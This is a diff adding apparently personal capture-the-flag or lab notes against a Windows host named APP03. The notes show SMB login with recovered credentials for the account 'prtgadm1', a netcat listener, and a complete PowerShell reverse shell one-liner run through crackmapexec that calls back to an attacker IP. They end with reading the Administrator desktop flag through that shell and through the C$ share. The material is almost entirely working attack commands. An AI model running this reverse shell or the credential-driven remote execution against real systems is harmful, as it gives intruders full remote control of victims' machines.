@@ -15,3 +15,20 @@ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
 
 SMB         10.129.201.50   445    APP03            [*] Windows 10.0 Build 17763 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
 SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
+
+
+
+nc -lnvp 443
+
+crackmapexec smb 10.129.201.50 -u prtgadm1 -p 'Pwn3d_by_PRTG!' -x "powershell -nop -w hidden -c \"$client = New-Object System.Net.Sockets.TCPClient('10.10.14.107',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""
+
+cd C:\Users\Administrator\Desktop
+dir
+type flag.txt
+
+crackmapexec smb 10.129.201.50 -u prtgadm1 -p 'Pwn3d_by_PRTG!' --shares
+
+smbclient //10.129.201.50/C$ -U prtgadm1
+
+cd Users/Administrator/Desktop
+get flag.txt
